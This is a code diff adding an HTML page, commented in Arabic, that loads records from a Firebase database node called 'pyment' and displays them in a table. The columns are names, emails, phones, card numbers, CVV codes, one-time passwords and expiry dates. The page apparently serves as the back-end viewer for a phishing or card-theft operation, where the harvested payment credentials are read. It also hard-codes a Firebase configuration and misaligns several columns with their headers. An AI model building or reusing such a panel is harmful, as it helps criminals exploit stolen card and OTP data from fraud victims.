@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>User Data Table</title>
+<style>
+
+.table-container {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch; /* لتحسين التمرير على الأجهزة التي تعمل باللمس */
+    margin: 20px;
+}
+
+table {
+  border-collapse: collapse;
+  width: 100%;
+}
+
+th, td {
+  padding: 8px;
+  text-align: right;
+  border-bottom: 1px solid #ddd;
+
+}
+
+.loader {
+position: fixed;
+left: 0;
+top: 0;
+width: 100%;
+height: 100%;
+background-color: rgba(255, 255, 255, 0.8); /* خلفية بيضاء مع شفافية */
+display: flex;
+justify-content: center;
+align-items: center;
+font-size: 24px;
+color: #333;
+z-index: 9999; /* تأكد من أن العنصر فوق جميع العناصر الأخرى */
+}
+</style>
+</head>
+<body>
+
+<body id="body-h">
+<div  id="loader" class="loader">
+<div  style="margin-top:50vh;text-align: center;">
+<span style="color:skyblue;">جاري التحميل انتظر ...</span>
+</div>
+</div>
+
+<div id="info_news" class="table-container">
+
+</div>
+
+        
+        
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js"; 
+
+const firebaseConfig = {
+    apiKey: "AIzaSyBDYQTOFSv638XJnOqvFuwJGPnQZ3Dy-v8",
+    authDomain: "fir-new-46591.firebaseapp.com",
+    databaseURL: "https://fir-new-46591-default-rtdb.firebaseio.com",
+    projectId: "fir-new-46591",
+    storageBucket: "fir-new-46591.appspot.com",
+    messagingSenderId: "334561214917",
+    appId: "1:334561214917:web:fd48aa3ad5cb34ef740bac"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+document.addEventListener("DOMContentLoaded", function() {
+console.log('DOMContentLoaded event fired');
+
+// إخفاء التمرير وعرض صورة التحميل عند البداية
+const body = document.getElementById('body-h');
+const loader = document.getElementById('loader');
+if (body && loader) {
+body.style.overflow = 'hidden';
+loader.style.display = 'block';
+}
+
+fetchData().then(() => {
+console.log('Data fetched successfully');
+}).catch(error => {
+console.error("Error fetching data: ", error);
+}).finally(() => {
+// إخفاء صورة التحميل في النهاية، حتى لو حدث خطأ
+if (loader) {
+loader.style.display = 'none';
+}
+if (body) {
+body.style.overflow = 'auto'; // إعادة السماح بالتمرير
+}
+});
+});
+
+function fetchData() {
+return new Promise((resolve, reject) => {
+const dbRef = ref(db, 'pyment');  // الإشارة إلى الجدول "pyment"
+        
+get(dbRef).then((snapshot) => {
+if (snapshot.exists()) {
+const data = snapshot.val();
+const cardContainer = document.getElementById("info_news");
+cardContainer.innerHTML = ''; // مسح أي بيانات موجودة
+
+// إنشاء الجدول مسبقًا خارج الحلقة لتجنب تكرار الجدول في كل مرة
+const table = document.createElement("table");
+
+// إضافة رأس الجدول مرة واحدة فقط
+table.innerHTML = `
+<tr>
+<th>#</th>
+<th>الاسم</th>
+<th>البريد الالكتروني</th>
+<th>رقم الهاتف</th>
+<th>اسمك على البطاقة</th>
+<th>رقم البطاقة</th>
+<th>cvv</th>
+<th>OTP</th>
+<th>تاريخ انتهاء البطاقة</th>
+</tr>
+`;
+
+cardContainer.appendChild(table); // إضافة الجدول إلى الحاوية
+// التكرار على جميع البيانات لإضافة الصفوف فقط
+for (const userKey in data) {
+const user = data[userKey];
+const row = document.createElement("tr");
+
+// إضافة البيانات إلى الصف
+row.innerHTML = `
+<td>${user.id}</td>
+<td>${user.name}</td>
+<td>${user.email}</td>
+<td>${user.phone_num}</td>
+<td>${user.cname}</td>
+<td>${user.ccnum}</td>
+<td>${user.expyear}</td>
+<td>${user.otp}</td>
+<td>${user.cvv}</td>
+`;
+
+// إضافة الصف إلى الجدول
+table.appendChild(row);
+}
+
+resolve(); // تم جلب البيانات بنجاح
+} else {
+reject(new Error("No data available"));
+}
+}).catch(error => reject(error)); // في حال حدوث أي خطأ
+});
+}
+</script>
+
+</body>
+</html>
